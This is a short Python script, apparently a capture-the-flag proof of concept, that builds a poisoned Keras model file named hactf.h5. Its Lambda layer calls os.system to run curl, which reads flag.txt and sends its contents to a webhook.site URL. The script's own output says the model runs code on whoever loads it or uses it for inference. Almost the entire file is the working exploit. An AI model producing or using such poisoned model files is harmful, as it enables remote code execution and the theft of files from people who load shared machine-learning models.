#!/usr/bin/env python3
"""
Create a malicious model using Lambda layer attack (like the POC)
This recreates the same attack vector as the Docker POC
"""

import tensorflow as tf
import sys

def create_lambda_attack_model(webhook_url=None):
    """Create a model with malicious Lambda layer"""
    
    if not webhook_url:
        webhook_url = "https://webhook.site/80c8be24-a555-479d-9717-40d313033c8c"
    
    def arbexe(x):
        """Malicious function that would execute in Lambda layer"""
        import os
        os.system(f"curl '{webhook_url}?zex=$(cat flag.txt)'")
        return x

    # Create model with malicious Lambda layer
    model = tf.keras.Sequential()
    model.add(tf.keras.layers.Input(shape=(64,)))
    model.add(tf.keras.layers.Lambda(arbexe))  # This is the malicious layer
    model.compile()
    model.save("hactf.h5")
    
    print("✅ Created hactf.h5 with malicious Lambda layer")
    print(f"🎯 Webhook URL: {webhook_url}")
    print("🚨 This model will execute RCE when loaded/used for inference!")
    print("💡 The Lambda layer contains: os.system(\"curl ...\")")

if __name__ == "__main__":
    webhook_url = None
    if len(sys.argv) > 1:
        webhook_url = sys.argv[1]
    
    create_lambda_attack_model(webhook_url)